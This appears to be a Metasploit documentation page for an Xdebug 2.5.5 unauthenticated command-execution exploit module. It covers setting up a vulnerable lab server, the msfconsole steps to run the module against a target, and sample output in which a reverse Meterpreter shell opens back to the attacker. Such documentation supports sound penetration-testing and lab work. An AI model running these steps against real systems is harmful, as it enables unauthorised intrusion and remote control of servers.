{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/unix/http/xdebug_unauth_exec","result":{"data":{"moduleMetadataJson":{"id":"f436fd7c-ef46-51ad-8e2b-c3554f8edf81","name":"xdebug Unauthenticated OS Command Execution","fullname":"exploit/unix/http/xdebug_unauth_exec","description":"Module exploits a vulnerability in the eval command present in Xdebug versions 2.5.5 and below.\n       This allows the attacker to execute arbitrary php code as the context of the web user.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/unix/http/xdebug_unauth_exec","documentationSlug":"/modules/documentation/exploit/unix/http/xdebug_unauth_exec","referencesSlug":"/modules/references/exploit/unix/http/xdebug_unauth_exec"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p><a href=\"https://xdebug.org/docs-dbgp.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Xdebug</a> is an actively-maintained PHP debugging tool that supports remote debugging of server-side PHP code</p>\n<p>This module exploits an unauthenticated vulnerability that allows for the upload of a PHP file and subsequent execution to provide a Meterpreter session back.  The module was tested on XDebug version 2.5.5</p>\n<p>The vulnerability was discovered by <a href=\"https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Ricter Zheng</a> (WARNING: This link is in Chinese.  <a href=\"https://translate.google.com/translate?hl=en&#x26;sl=auto&#x26;tl=en&#x26;u=https%3A%2F%2Fricterz.me%2Fposts%2FXdebug%3A%20A%20Tiny%20Attack%20Surface\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Google Translate version</a>)</p>\n<h3 id=\"setting-up-xdebug-255-on-xubuntu-1604-x64-desktop\" style=\"position:relative;\"><a href=\"#setting-up-xdebug-255-on-xubuntu-1604-x64-desktop\" aria-label=\"setting up xdebug 255 on xubuntu 1604 x64 desktop permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Setting up XDebug 2.5.5 on xUbuntu 16.04 x64 Desktop</h3>\n<p>Start with a LAMP server:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">sudo apt update &amp;&amp; sudo apt install -y tasksel\nsudo tasksel install lamp-server</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>Now grab XDebug, specifically the version cited by @MinatoTW:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">wget https://xdebug.org/files/xdebug-2.5.5.tgz\ntar xvzf xdebug-2.5.5.tgz \ncd xdebug-2.5.5/\nphp -i</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Paste the contents of your <code class=\"language-text\">php -i</code> output into <a href=\"https://xdebug.org/wizard.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">the XDebug installation wizard</a>, which gave me the following:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">sudo apt install -y php7.0-dev\nphpize &amp;&amp; ./configure &amp;&amp; make\nsudo cp modules/xdebug.so /usr/lib/php/20151012/</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p>The final step of the wizard is to configure <code class=\"language-text\">php.ini</code>:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">sudo -s\ncat &gt;&gt; /etc/php/7.0/cli/php.ini &lt;&lt;EOL\nzend_extension = /usr/lib/php/20151012/xdebug.so\nxdebug.remote_enable = 1\nxdebug.remote_handler = dbgp\nxdebug.remote_autostart = 0\nxdebug.remote_connect_back = 1\nxdebug.remote_port = 9000\nxdebug.remote_host = 127.0.0.1\nxdebug.profiler_enable=0\nxdebug.profiler_enable_trigger=1\nxdebug.profiler_output_dir=&quot;/tmp&quot;`\nEOL\nexit</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Now that the PHP CLI environment is configured, repeat the above steps for the Apache2 configuration:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">sudo -s\ncat &gt;&gt; /etc/php/7.0/cli/php.ini &lt;&lt;EOL\nzend_extension = /usr/lib/php/20151012/xdebug.so\nxdebug.remote_enable = 1\nxdebug.remote_handler = dbgp\nxdebug.remote_autostart = 0\nxdebug.remote_connect_back = 1\nxdebug.remote_port = 9000\nxdebug.remote_host = 127.0.0.1\nxdebug.profiler_enable=0\nxdebug.profiler_enable_trigger=1\nxdebug.profiler_output_dir=&quot;/tmp&quot;`\nEOL\nexit</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>And restart Apache2 for good measure:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">sudo service apache2 restart</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>And now test that XDebug is working:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">php -r &#39;echo xdebug_time_index();&#39;; echo</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>You should see a fairly small number, in my case <code class=\"language-text\">4.6014785766602E-5</code>, which indicates the number of seconds since the php script started, thus the incredibly small number.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ul>\n<li>Start <code class=\"language-text\">msfconsole</code></li>\n<li><code class=\"language-text\">use exploits/unix/http/xdebug_rce</code></li>\n<li><code class=\"language-text\">check</code></li>\n<li><code class=\"language-text\">set RHOST 192.168.69.2</code></li>\n<li><code class=\"language-text\">set LHOST 192.168.69.1</code></li>\n<li><code class=\"language-text\">set VERBOSE true</code> (optional)</li>\n<li><code class=\"language-text\">exploit</code></li>\n</ul>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"xdebug-255-on-ubuntu-1604-with-apache2-2418\" style=\"position:relative;\"><a href=\"#xdebug-255-on-ubuntu-1604-with-apache2-2418\" aria-label=\"xdebug 255 on ubuntu 1604 with apache2 2418 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>XDebug 2.5.5 on Ubuntu 16.04 with Apache2 2.4.18</h3>\n<p>msf5 exploit(unix/http/xdebug<em>unauth</em>exec) > check</p>\n<p>[*] 192.168.69.2:80 - Request sent\nDate: Fri, 27 Apr 2018 21:00:37 GMT\nServer: Apache/2.4.18 (Ubuntu)\nSet-Cookie: XDEBUG_SESSION=WIO6hf4Wez; expires=Fri, 27-Apr-2018 22:00:37 GMT; Max-Age=3600; path=/\nContent-Length: 16\nContent-Type: text/html; charset=UTF-8</p>\n<p>[+] 192.168.69.2:80 - Looks like remote server has xdebug enabled</p>\n<p>[*] 192.168.69.2:80 The target service is running, but could not be validated.</p>\n<p>msf5 exploit(unix/http/xdebug<em>unauth</em>exec) > exploit</p>\n<p>[*] Started reverse TCP handler on 192.168.69.1:4444\n[*] 192.168.69.2:80 - Waiting for client response.\n[*] 192.168.69.2:80 - Receiving response\n508<?xml version=\"1.0\" encoding=\"iso-8859-1\"?>\n<init xmlns=\"urn:debugger_protocol_v1\" xmlns:xdebug=\"http://xdebug.org/dbgp/xdebug\" fileuri=\"file:///var/www/html/index.php\" language=\"PHP\" xdebug:language_version=\"7.0.28-0ubuntu0.16.04.1\" protocol_version=\"1.0\" appid=\"28166\" idekey=\"5Gg6S9au8B\"><engine version=\"2.5.5\"><![CDATA[Xdebug]]></engine><author><![CDATA[Derick Rethans]]></author><url><a href=\"!%5BCDATA%5Bhttp://xdebug.org%5D%5D\">![CDATA[http://xdebug.org]]</a></url><copyright><![CDATA[Copyright (c) 2002-2017 by Derick Rethans]]></copyright></init>\n[*] 192.168.69.2:80 - Shell might take upto a minute to respond.Please be patient.\n[*] 192.168.69.2:80 - Sending payload of size 2098 bytes\n[*] Sending stage (37775 bytes) to 192.168.69.2\n[*] Meterpreter session 1 opened (192.168.69.1:4444 -> 192.168.69.2:55506) at 2018-04-27 15:57:58 -0500\n[+] 192.168.69.2:80 - Deleted /tmp/OLEaK</p>"}}},"pageContext":{"id":"f436fd7c-ef46-51ad-8e2b-c3554f8edf81"}}}